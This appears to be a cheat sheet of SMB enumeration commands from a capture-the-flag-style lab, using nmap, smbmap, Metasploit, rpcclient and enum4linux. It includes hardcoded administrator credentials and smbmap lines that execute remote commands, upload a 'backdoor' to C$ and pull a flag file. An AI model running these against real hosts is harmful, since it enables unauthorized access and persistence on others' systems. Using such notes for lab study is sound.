# Nmap

`nmap --script=smb-protocols -p445 <target>`

`nmap --script=smb-os-discovery -p445 <target>`

`nmap --script=smb-security-mode -p445 <target>`

`nmap --script=smb-enum-sessions -p445 <target>`

`nmap --script=smb-enum-shares -p445 <target>`

`nmap --script=smb-ls -p445 <target>`

`nmap --script=smb-enum-users -p445 <target>`

`nmap --script=smb-enum-domains -p445 <target>`

`nmap --script=smb-enum-groups -p445 <target>`

`nmap --script=smb-enum-services -p445 <target>`

`nmap --script=smb-server-stats -p445 <target>`

`nmap --script=smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 -p445 <target>`

# SMBmap

`smbmap -u administrator -p smbserver_771 -H <target>`

`smbmap -u administrator -p smbserver_771 -d . -H <target>`

`smbmap -u administrator -p smbserver_771 -L -H <target>`

`smbmap -u administrator -p smbserver_771 -r 'C$' -H <target>`

`smbmap -u administrator -p smbserver_771 -x 'ipconfig' -H <target>`

`smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H <target>`

`smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H <target>`

# Metasploit

`msf6> use auxiliary/scanner/smb/smb_version`

`msf6> use auxiliary/scanner/smb/smb2`

`msf6> use auxiliary/scanner/smb/smb_enumshares`

`msf6> use auxiliary/scanner/smb/pipe_auditor`

# NMBlookup

`nmblookup -A <target>`

# SMBclient

`smbclient -L -N <target>`

# RPCclient

`rpcclient -U "" -N <target>`

`$> srvinfo`

`$> enumdomusers`

`$> enumdomgroups`

`$> lookupnames admin`

# Enum4linux

`enum4linux -o <target>`

`enum4linux -U <target>`

`enum4linux -S <target>`

`enum4linux -G <target>`

`enum4linux -i <target>`

`enum4linux -r <target>`